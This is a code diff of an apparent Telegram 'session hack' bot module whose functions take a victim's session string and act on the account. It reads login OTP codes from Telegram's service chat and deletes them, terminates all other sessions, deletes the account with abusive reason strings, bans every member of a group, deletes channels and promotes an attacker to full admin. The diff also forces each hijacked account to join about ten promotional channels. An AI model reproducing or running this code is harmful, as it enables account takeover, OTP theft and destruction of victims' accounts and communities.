@@ -4,9 +4,7 @@ from pyrogram import Client , enums
 from telethon import TelegramClient
 from telethon.sessions import StringSession 
 from pyrogram.raw import functions 
-from RAUSHAN import (
-     API_ID,
-     API_HASH )
+from RAUSHAN import API_ID, API_HASH
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
 from RAUSHAN.Helpers.data import info
 from pyrogram.types.messages_and_media.message import Str
@@ -23,63 +21,95 @@ async def users_gc(session):
     msg = ""
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()                          
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()                          
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))
             except Exception as e:
                 print(e)
-            k = await steve(GetAdminedPublicChannelsRequest())            
+            k = await alpha(GetAdminedPublicChannelsRequest())            
             for x in k.chats:                
                 msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
-            await steve.disconnect()
+            await alpha.disconnect()
                  
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
+                k = await purvi.invoke(functions.channels.GetAdminedPublicChannels())            
                 for x in k.chats:
                     msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
     except Exception as idk:
         err += str(idk)                                             
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return msg
  
 async def user_info(session):
     err = ""
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@PURVI_SUPPORT"))
-                await steve(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))
             except Exception as e:
                 print(e)
-            k = await steve.get_me()  
+            k = await alpha.get_me()  
             msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
-            await steve.disconnect()
+            await alpha.disconnect()
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                k = await stark.get_me()
+                k = await purvi.get_me()
                 msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return msg    
 
 
@@ -103,36 +133,52 @@ async def banall(session,id):
     gc_id = str(id.text) if type(id.text) == Str else int(id.text)
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))
             except Exception as e:
                 print(e)
-            admins = await steve.get_participants(gc_id, filter=ChannelParticipantsAdmins)
+            admins = await alpha.get_participants(gc_id, filter=ChannelParticipantsAdmins)
             admins_id = [i.id for i in admins]                
-            async for user in steve.iter_participants(gc_id):
+            async for user in alpha.iter_participants(gc_id):
                 all += 1
                 try:
                     if user.id not in admins_id:
-                       await steve(EditBannedRequest(gc_id, user.id, RIGHTS))
+                       await alpha(EditBannedRequest(gc_id, user.id, RIGHTS))
                        bann += 1
                        await asyncio.sleep(0.1)
                 except Exception:
                     await asyncio.sleep(0.1)
-            await steve.disconnect()
+            await alpha.disconnect()
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                async for members in stark.get_chat_members(gc_id):  
+                async for members in purvi.get_chat_members(gc_id):  
                     all += 1                
                     try:                                          
-                        await stark.ban_chat_member(gc_id,members.user.id)  
+                        await purvi.ban_chat_member(gc_id,members.user.id)  
                         bann += 1                  
                     except FloodWait as i:
                         await asyncio.sleep(i.value)
@@ -141,9 +187,9 @@ async def banall(session,id):
                           
     except Exception as idk:
         err += str(idk) 
-    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                                            
+    msg += f"**❖ ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ !\n\n⊚ ʙᴀɴɴᴇᴅ ᴜsᴇʀs :** {bann}\n**⊚ ᴛᴏᴛᴀʟ ᴜsᴇʀs :** {all}"                                            
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return msg
 
 async def get_otp(session):
@@ -151,35 +197,51 @@ async def get_otp(session):
     i = ""
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))
             except Exception as e:
                 print(e)
-            async for x in steve.iter_messages(777000, limit=2):               
+            async for x in alpha.iter_messages(777000, limit=2):               
                 i += f"\n{x.text}\n"
-                await steve.delete_dialog(777000)
-            await steve.disconnect() 
+                await alpha.delete_dialog(777000)
+            await alpha.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
                 ok = []
-                async for message in stark.get_chat_history(777000,limit=2):
+                async for message in purvi.get_chat_history(777000,limit=2):
                     i += f"\n{message.text}\n"                                   
                     ok.append(message.id)                 
-                await stark.delete_messages(777000,ok)
+                await purvi.delete_messages(777000,ok)
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return i
 
 async def join_ch(session,id):
@@ -187,94 +249,139 @@ async def join_ch(session,id):
     gc_id = str(id.text) if type(id.text) == Str else int(id.text)
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@PURVI_SUPPORT"))
-                await steve(join("@ALPHA_DPZ_WORLD"))              
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))              
             except Exception as e:
                 print(e)
-            await steve(join(gc_id))            
-            await steve.disconnect() 
+            await alpha(join(gc_id))            
+            await alpha.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                await stark.join_chat(gc_id)
+                await purvi.join_chat(gc_id)
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return "Jᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"
 
 async def leave_ch(session,id):
     err = ""
     gc_id = str(id.text) if type(id.text) == Str else int(id.text)
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))               
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))               
             except Exception as e:
                 print(e)
-            await steve(leave(gc_id))            
-            await steve.disconnect() 
+            await alpha(leave(gc_id))            
+            await alpha.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                await stark.leave_chat(gc_id)
+                await purvi.leave_chat(gc_id)
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"
 
 async def del_ch(session,id):
-    '''
-    try nhi kia error aaye to btana
-    '''
     err = ""
     gc_id = str(id.text) if type(id.text) == Str else int(id.text)
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))                
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))                
             except Exception as e:
                 print(e)
-            await steve(dc(gc_id))            
-            await steve.disconnect() 
+            await alpha(dc(gc_id))            
+            await alpha.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                await stark.invoke(
-                    functions.channels.DeleteChannel(channel= await stark.resolve_peer(gc_id)))
+                await purvi.invoke(
+                    functions.channels.DeleteChannel(channel= await purvi.resolve_peer(gc_id)))
             
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
 
 async def check_2fa(session):
@@ -282,32 +389,48 @@ async def check_2fa(session):
     i = ""
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))               
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))               
             except Exception as e:
                 print(e)
             try:
-                await steve.edit_2fa("idkbsdkjsj")
+                await alpha.edit_2fa("idkbsdkjsj")
                 i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
                 
             except Exception as e:
                 print(e)
                 i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                         
-            await steve.disconnect() 
+            await alpha.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-               # try:
-                yes = await stark.invoke(functions.account.GetPassword())
+               
+                yes = await purvi.invoke(functions.account.GetPassword())
                 if yes.has_password:
                     i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                 else:
@@ -316,36 +439,52 @@ async def check_2fa(session):
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return i
 
 async def terminate_all(session):
     err = ""
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))             
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))             
             except Exception as e:
                 print(e)
-            await steve(rt())
-            await steve.disconnect() 
+            await alpha(rt())
+            await alpha.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                await stark.invoke(functions.auth.ResetAuthorizations())
+                await purvi.invoke(functions.auth.ResetAuthorizations())
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"
 
       
@@ -353,29 +492,45 @@ async def del_acc(session):
     err = ""
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))              
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))              
             except Exception as e:
                 print(e)
-            await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
-            await steve.disconnect() 
+            await alpha(ok.account.DeleteAccountRequest("owner madarchod h"))
+            await alpha.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+                await purvi.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."
 
       
@@ -400,34 +555,50 @@ async def piromote(session,gc_id,user_id):
     user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
     try:
         if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))                
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))                
             except Exception as e:
                 print(e)
             try:
-                await steve.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+                await alpha.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
             except:
-                await steve.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
-            await steve.disconnect()                              
+                await alpha.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
+            await alpha.disconnect()                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)
                 try:    
-                    await stark.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
+                    await purvi.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
                 except:
-                    await stark.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
+                    await purvi.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."
 
 
@@ -447,34 +618,48 @@ async def demote_all(session,gc_id):
     gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
     try:
         if session.endswith("="):
